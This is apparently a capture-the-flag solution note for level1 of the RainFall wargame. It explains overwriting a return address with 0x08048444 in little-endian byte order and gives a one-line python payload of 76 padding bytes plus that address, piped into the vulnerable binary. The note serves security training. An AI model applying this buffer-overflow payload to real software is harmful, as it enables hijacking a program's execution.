# 0x08048444 should be overwritten to the return address, but it should be in little endian: "\x44\x84\x04\x08"

# Solution:

level1@RainFall:~$ (python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
